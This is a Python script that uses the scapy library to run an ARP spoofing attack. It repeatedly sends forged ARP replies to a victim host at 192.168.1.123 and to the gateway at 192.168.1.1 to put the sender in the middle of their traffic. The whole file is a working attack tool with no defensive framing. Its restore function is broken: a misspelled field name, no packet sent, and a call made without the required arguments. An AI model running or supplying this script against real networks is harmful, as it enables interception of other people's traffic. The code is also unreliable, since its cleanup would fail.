import time

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # ARP request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # broadcast the pack to the whole network
    arp_request_broadcast = broadcast / arp_request  # combining to one packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # send n receive the answered packets

    return answered_list[0][1].hwsrc


# scapy.ls(scapy.ARP)  #List all the options for the ARP command
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)  # Getting the MAC address by the first function
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  # Create an ARP packet response
    scapy.send(packet, verbose=False)  # Sending the packet


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, prsc=src_ip, hwsrc=src_mac)


packets_count = 0
try:
    while True:
        spoof("192.168.1.123", "192.168.1.1")
        spoof("192.168.1.1", "192.168.1.123")
        packets_count += 2
        print("\r[+] Packets sent: " + str(packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore()
    print("[+] CTRL + C ... Quitting.")
